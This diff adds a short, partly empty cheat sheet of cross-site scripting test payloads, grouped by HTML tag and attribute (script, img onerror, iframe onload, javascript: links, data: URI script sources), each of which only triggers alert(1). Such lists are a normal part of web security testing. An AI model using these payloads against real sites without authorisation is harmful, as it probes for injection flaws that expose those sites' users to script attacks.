@@ -1,0 +1,21 @@
+Pure Tags
+
+Any tag - <script>alert(1)</script>
+META - 
+DIV - <div%20onclick=alert(1)>clickme</div>
+IMG - <img src=x onerror=alert(1)>
+STYLE - 
+IFRAME - <iframe onload=alert(1)></iframe>
+
+Attributes restricted
+
+DIV - STYLE
+HREF - A - <a href="javascript:alert(1)">test</a>
+HREF - STYLE
+SCRIPT - SRC - <script%20src="data:text/javascript,alert(1);"></script>
+BODY - ONLOAD
+
+Other attacks
+
+Expression based attacks - 
+Multiline tags - 
